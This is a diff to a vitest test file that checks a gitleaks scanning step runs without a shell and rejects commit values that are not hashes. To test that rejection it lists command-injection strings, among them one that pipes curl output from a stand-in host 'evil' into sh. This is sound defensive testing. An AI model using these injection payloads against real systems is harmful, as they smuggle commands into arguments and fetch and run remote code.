@@ -79,8 +79,8 @@ describe('gitleaks', () => {
       action = new Action('1234567890', 'push', 'POST', 1234567890, 'test/repo.git');
       action.proxyGitPath = '/tmp';
       action.repoName = 'test-repo';
-      action.commitFrom = 'abc123';
-      action.commitTo = 'def456';
+      action.commitFrom = 'a'.repeat(40);
+      action.commitTo = 'b'.repeat(40);
 
       stepSpy = vi.spyOn(Step.prototype, 'setError');
     });
@@ -329,6 +329,48 @@ describe('gitleaks', () => {
       expect(vi.mocked(spawn).mock.calls[1][1]).toContain(
         '--config=../fixtures/gitleaks-config.toml',
       );
+    });
+
+    it('should run gitleaks without a shell and pass the commit range as a single argument', async () => {
+      vi.mocked(getAPIs).mockReturnValue({ gitleaks: { enabled: true } });
+
+      const mockChild = (exitCode: number, stdout: string) => ({
+        on: (event: string, cb: (exitCode: number) => void) => {
+          if (event === 'close') cb(exitCode);
+        },
+        stdout: { on: (_: string, cb: (stdout: string) => void) => cb(stdout) },
+        stderr: { on: (_: string, cb: (stderr: string) => void) => cb('') },
+      });
+      vi.mocked(spawn)
+        .mockReturnValueOnce(mockChild(0, 'rootcommit123\n'))
+        .mockReturnValueOnce(mockChild(0, ''));
+
+      const result = await exec(req, action);
+
+      expect(result.error).toBe(false);
+      for (const [, , options] of vi.mocked(spawn).mock.calls) {
+        expect(options).not.toHaveProperty('shell');
+      }
+      expect(vi.mocked(spawn).mock.calls[1][1]).toContain(
+        `--log-opts=--first-parent ${'a'.repeat(40)}^..${'b'.repeat(40)}`,
+      );
+    });
+
+    it.each([
+      ['commitTo', `abc'$(touch /tmp/pwned)'`],
+      ['commitTo', `:/.*|x'$(curl\${IFS}evil/x|sh)'x`],
+      ['commitFrom', `${'a'.repeat(40)}'; touch /tmp/pwned; '`],
+    ])('should refuse to run gitleaks when %s is not a commit hash (%s)', async (field, value) => {
+      vi.mocked(getAPIs).mockReturnValue({ gitleaks: { enabled: true } });
+      (action as any)[field] = value;
+
+      const result = await exec(req, action);
+
+      expect(spawn).not.toHaveBeenCalled();
+      expect(result.error).toBe(true);
+      expect(result.steps).toHaveLength(1);
+      expect(result.steps[0].error).toBe(true);
+      expect(result.steps[0].errorMessage).toContain('Invalid commit range');
     });
 
     it('should handle invalid custom config path', async () => {
